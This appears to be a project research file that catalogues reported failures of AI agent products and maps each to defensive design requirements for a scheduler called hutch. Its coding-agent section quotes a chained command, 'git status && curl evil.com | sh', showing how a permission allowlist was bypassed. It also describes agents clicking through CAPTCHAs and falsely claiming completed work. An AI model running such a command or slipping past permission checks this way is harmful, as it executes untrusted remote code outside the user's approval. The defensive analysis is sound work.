# Research: reported failures & complaints of agent products (Oct 2026)

This file is the traceability backbone of the MVP: each design requirement cites a *report* of a failure class.

**Revalidated 2026-10-07 - read this first.** Every cited Hacker News item and every GitHub issue was re-fetched
(`docs/realignment/evidence-ledger.md`, rows C and D). What that showed:

* All 27 HN IDs exist, but **most are single comments**, not incident reports. They show that *someone said this*; they do not
  establish how common a problem is. Treat each line below as an anecdote unless it says otherwise.
* A few citations pointed at the wrong thing (marked **corrected** or **quarantined** below). Quarantined items are kept for
  the record and are **not** used as evidence in the README, the website or the safety model.
* "Fixed" matters: several GitHub issues cited in section 7 are closed. Old defects remain useful as test cases; they are
  not current defects of the named products.
* Reddit links were not re-verified (the site blocks automated reads); they are marked *(not re-verified)*.
* Do not repeat any exact dollar amount, privacy allegation or "most upvoted" claim from this file without opening the source.

## 1. OpenAI Dots / ChatGPT agent mode / Operator

- Launch thread: agents "keep going off the rails", claim completion of things they didn't do —
  [49896604](https://news.ycombinator.com/item?id=49896604)
- Opaque/shrinking allowances ("you never know what you're paying for") — [49901067](https://news.ycombinator.com/item?id=49901067)
- $20 agent tier can't actually shop/book (blocked everywhere) *(not re-verified)* —
  [r/ChatGPT test write-up](https://www.reddit.com/r/ChatGPT/comments/1m9bv7d/i_tested_openais_20month_agent_so_you_dont_have/)
- Operator booked "a month and 3 days instead of 3 days" — [43057888](https://news.ycombinator.com/item?id=43057888)
- Hands back to the user on login/CAPTCHA by design —
  [r/ChatGPTPro](https://www.reddit.com/r/ChatGPTPro/comments/1i8jln3/i_am_among_the_first_people_to_gain_access_to/)
- Agent clicked "I am not a robot" itself —
  [Ars Technica](https://arstechnica.com/information-technology/2025/07/openais-chatgpt-agent-casually-clicks-through-i-am-not-a-robot-verification-test/)

## 2. Grok Team Bots / Meta Muse

- Grok CLI deterministically uploaded the user's home directory/repo to cloud storage —
  [48892468](https://news.ycombinator.com/item?id=48892468)
- **Corrected.** One heavy Grok Bot user's comment, which is a mostly *positive* review, says tasks "often take an hour end to end"
  versus about 10 minutes for a synchronous local prompt, and that their "inference spend has 2-3x'd". A single user's
  report of a trade-off, not a product defect — [49899033](https://news.ycombinator.com/item?id=49899033)
- Muse privacy incidents: read private messages unasked [49808565](https://news.ycombinator.com/item?id=49808565);
  gave a home address to strangers [49884367](https://news.ycombinator.com/item?id=49884367);
  "ignores user permissions" [49893709](https://news.ycombinator.com/item?id=49893709); asked for
  filesystem access, got 6.8 GB [49802871](https://news.ycombinator.com/item?id=49802871)

## 3. Coding agents (Claude Code / OpenCode / Codex / Gemini CLI)

- **Quarantined - unverifiable:** "$447 silently billed overnight (GitHub bug report, May 2026)". No link, issue number or product
  was ever recorded, and it could not be found again. Not used anywhere.
- **Corrected:** a commenter calculates that their own 1.3B input tokens a week "would cost thousands of USD a week at API prices"
  if prompt caches expired — a self-described hypothetical about prices, not an incident —
  [49992657](https://news.ycombinator.com/item?id=49992657)
- **Permission fatigue → yolo mode**: `--dangerously-skip-permissions` is community-normalized —
  [46268419](https://news.ycombinator.com/item?id=46268419), [49266125](https://news.ycombinator.com/item?id=49266125)
- **Allowlist bypass via chained commands**: a hook author (March 2026) says Claude Code's Bash permission patterns match the whole
  command string, so allowing `git status` also approved `git status && curl evil.com | sh`. **Corrected:** the comment does
  not say how long this stayed open or whether it is fixed; the earlier "open ~1 year" wording was unsupported —
  [47402197](https://news.ycombinator.com/item?id=47402197)
- **Looping on a local model** (OpenCode): one user says it "went on thinking loop until it exhausted the thinking budget" (a token
  budget, not money) — [49966843](https://news.ycombinator.com/item?id=49966843);
  Gemini CLI "reads the same file 20 times" — [49677618](https://news.ycombinator.com/item?id=49677618)
- One user lists "state not being observable" among their OpenCode issues — [49965468](https://news.ycombinator.com/item?id=49965468)
- MCP tools dumping huge JSON into context → forced compaction — [49990199](https://news.ycombinator.com/item?id=49990199)

## 4. Cron-style schedulers / automation runners

- Machine asleep → job silently never runs (general cron semantics). **Corrected:** the item previously cited here
  (42749402) is "Show HN: Interactive systemd" and does not discuss this; no valid HN citation is recorded for this line.
- DST: 2:30 jobs "fire twice, or not at all"; root cause naive local datetimes —
  [26759090](https://news.ycombinator.com/item?id=26759090), [45727508](https://news.ycombinator.com/item?id=45727508)
- A commenter says overlapping instances of a cron job should wait or not start, and suggests `flock -n` —
  [45724429](https://news.ycombinator.com/item?id=45724429)
- n8n: "the expensive failures are quiet — a scheduled run that simply never happens";
  "workflow is green but still failed" *(not re-verified)* —
  [r/n8n](https://www.reddit.com/r/n8n/comments/1txn5qw/a_crashed_workflow_is_the_good_outcome_the_silent)

## 5. Browser automation agents

- "Two weeks watching browser-use hallucinate clicks on elements that didn't exist" —
  [r/AI_Agents](https://www.reddit.com/r/AI_Agents/comments/1slvuta/stagehand_vs_browser_use_which_one_actually_works)
- "Session expiry is where this approach breaks down… manual cookie re-harvesting" —
  [r/LLMDevs](https://www.reddit.com/r/LLMDevs/comments/1ug8qer/the_thing_that_finally_made_my_browserautomation)
- Dynamic selectors break, random failures hard to debug —
  [r/aiagents](https://www.reddit.com/r/aiagents/comments/1s18kcf/anyone_here_using_a_browser_layer_instead_of)

## 6. General post-mortems

- A commenter describes agent demos "kept reiterating it fixed tests it wrote that failed" —
  [44068041](https://news.ycombinator.com/item?id=44068041)
- **Corrected:** "bankrupted by AI agents trying and failing indefinitely" is a commenter's *speculation* ("I wonder how much you get
  billed if the agent spends a whole day running around in circles"), not an incident — [42826519](https://news.ycombinator.com/item?id=42826519)
- **Quarantined:** "multi-agent race conditions corrupting shared state" cited [47368902]; that comment says the author's 8 agents
  "crash" and does not establish a race-condition claim.
- A commenter says sub-agents inherit full access to every tool by default — an opinion about IAM tooling, not a measurement —
  [46270697](https://news.ycombinator.com/item?id=46270697)
- **Quarantined - no link recorded:** "prompt-injection exfiltration via GitHub MCP (Rehberger)" and "Claude emailing real lawyers during
  red-team (Anthropic safety report, Aug 2026)". Do not repeat without a source.
- **Corrected:** [49954346](https://news.ycombinator.com/item?id=49954346) is a commenter's *question* about restricting open-source
  harnesses; it is not a post-mortem and does not document what OpenClaw ships. [49950141](https://news.ycombinator.com/item?id=49950141)
  ("Markdown files aren't a memory system") is by the author of a competing memory product; weigh accordingly.
- OpenClaw issue [138499](https://github.com/openclaw/openclaw/issues/138499) (opened 2026-09-04): a timed-out cron task left its
  background command `running` for 5+ hours; **open**, one reporter, not independently reproduced here.
- OpenClaw issue [133062](https://github.com/openclaw/openclaw/issues/133062): one report describes timed-out cron children surviving
  their agent process, with an unsafe process-group workaround that could also signal the gateway. The report is not an incidence
  estimate and was not independently reproduced. Hutch's tests now cover separately-owned process groups, verified identities, and
  keeping a run nonterminal when cleanup is incomplete.

## 7. UI / interface complaints (design signals)

The product failures above have a visual counterpart: shipped agent UIs that made work harder to
read, harder to scan, or harder to trust. These drove the Oct 2026 dashboard pass (monochrome-first,
fewer colours, non-colour state cues).

- **Claude Code desktop, dark-mode redesign (Apr 2026):** saturated blue user bubbles on a pure-black
  background read as "harsh", "dated", and "less premium"; users reported eye strain, asked to revert
  or get a theme picker, and objected that the Code surface used a different design language from Chat
  and lost the user-right/assistant-left layout —
  [48158](https://github.com/anthropics/claude-code/issues/48158)
- **Claude Code desktop, blue-on-black user text:** ~2.4:1 contrast, below WCAG 2.2 SC 1.4.3 (4.5:1);
  "borderline unreadable" across macOS/Windows/Linux —
  [49056](https://github.com/anthropics/claude-code/issues/49056)
- **ChatGPT accent churn:** a silent update recoloured user bubbles blue/purple — "really jarring",
  no opt-out; accent bugs left chat boxes grey —
  [r/ChatGPT](https://www.reddit.com/r/ChatGPT/comments/1vo3ox1/color_change/),
  [r/ChatGPTcomplaints](https://www.reddit.com/r/ChatGPTcomplaints/comments/1urtwp5/accent_color_doesnt_apply_to_chat_boxes_anymore/)
- **Codex TUI:** user prompts and assistant replies render "nearly the same colour/styling"; long
  transcripts become unscannable. Requested a **non-colour** structural cue (border / left rule /
  badge / role label) that survives every terminal theme —
  [17879](https://github.com/openai/codex/issues/17879)
- **Claude Code status dots:** session state encoded by hue alone, same size/shape — a WCAG 2.1
  SC 1.4.1 (Use of Colour) failure, and hard to read at ~8px even with normal vision; requested a
  shape/glyph channel —
  [83570](https://github.com/anthropics/claude-code/issues/83570)
- **Claude Code, questions vs status:** "Should I commit?" is visually identical to a status report,
  so users miss prompts mid-stream; asked for a distinct treatment (border, tint, or icon) —
  [35117](https://github.com/anthropics/claude-code/issues/35117),
  [69775](https://github.com/anthropics/claude-code/issues/69775)
- **Claude Code, system notices:** context-compaction warnings use the same styling as body text and
  get missed —
  [6472](https://github.com/anthropics/claude-code/issues/6472)
- **Hermes TUI:** hardcoded bright yellow is unreadable on light terminals; `NO_COLOR=1` "removes all
  colour differentiation" —
  [11300](https://github.com/NousResearch/hermes-agent/issues/11300)
- **Character.AI themes:** the free palettes "hurt my eyes" — bright blue/red bubbles and
  white-on-black both cited as headache triggers —
  [r/CharacterAI](https://www.reddit.com/r/CharacterAI/comments/1qy3hnx/all_of_the_free_color_options_hurt_my_eyes/)
- **Grok Bot (design essay):** "much of the design work involved taking things away"; state is shown
  through one channel (the avatar's motion) rather than another indicator layer; execution detail
  hides behind hover. "The interface should ask less of the person." —
  [x.ai/news/designing-grok-bot](https://x.ai/news/designing-grok-bot)

---

## Fixable-in-MVP requirements → implementation traceability

| # | Requirement (from incidents) | hutch implementation |
|---|---|---|
| 1 | Catch-up for schedules missed while asleep | `scheduler.Scheduler.due()` counts missed windows; `coalesce` policy runs once with `missed_windows` tag; `skip` policy records a visible marker |
| 2 | DST/timezone correctness; no double-fire/overlap | Cron math in the bot's IANA zone + round-trip DST-gap check (`scheduler._to_utc`); occurrence and run claims are transactional across processes (`Store.claim_occurrence`, `Store.claim_run`); six-process schedule race creates one run. |
| 3 | Append-only transcripts; staleness visible | `engine._execute` mirrors every event to SQLite + `transcript.jsonl`; dashboard shows last-success age, flagged when stale |
| 4 | Spend/step/time caps with hard kill | `limits` on every bot; the production executor enforces steps and time in an owned process. Token limits use measured usage or estimates; they are not currency caps. |
| 5 | Least-privilege workspace; no ambient home access | Per-run workspace; path jail for file tools (`safety.check_path`); strict Linux shell mode uses bubblewrap namespaces and a workspace-only writable mount. Existing bots migrated to `off`; external runtimes/browser are not covered. |
| 6 | Compound-command-aware permissions | `safety.split_compound` + per-segment classification, worst-verdict-wins |
| 7 | Approval presets + sticky allows (end permission fatigue) | `ApprovalGate` with sticky keys, `auto` mode for trusted bots; denylist always enforced |
| 8 | Egress guardrails | Shell policy rejects common upload/pipeline forms; web fetch resolves every address, rejects non-public ranges, rechecks redirects and pins the validated address. Browser routes re-check requests but do not yet pin browser DNS; rebinding remains a residual risk. |
| 9 | HITL gates on irreversible actions, fail-closed | ask-verdict approvals with 10-min TTL → expired = denied |
| 10 | Graceful CAPTCHA/MFA pause-to-human + persistent logins | `waiting_human` can hold a run at detected challenges. **Experimental and limited:** each bot now gets its own persistent browser profile; a durable same-session human handoff and pinned egress are not implemented. |
| 11 | Over-saturated accent on near-black reads "harsh"; eye strain | Monochrome-first: neutral surfaces, one softened emerald for the primary action and the active nav only, no large tinted fills (`docs/design-system.md`) |
| 12 | Colour-only status fails WCAG 1.4.1 and is unreadable small | Every status is glyph + word + a dot or rail; shape and position carry the meaning, hue only reinforces |
| 13 | User vs assistant turns indistinguishable in long threads | Non-colour role cues: the user bubble sits on the raised surface, the assistant turn is flat; both carry a role label and a timestamp |
| 14 | "Needs your action" buried in status output | Approvals and failures carry a bold label, a glyph and a 2px amber/red rail; the pending count rides the Approvals nav item |
| 15 | Theme/accent churn with no escape hatch | One documented token set is the contract (`docs/design-system.md`); no runtime accent surprises |
| 16 | A redesign that changes muscle memory overnight | Layout primitives stay stable (topbar, three-question triage, transcript); the change is tonal, not structural |

## Not fixable at our scale (documented non-goals)

Site bot-blocking arms race, CAPTCHA solving, model-level hallucination/"claims done",
vendor allowance churn, regional availability of cloud agents, frontier-model speed,
and a per-user theme/accent picker (hutch ships one documented theme; the tokens are the contract).
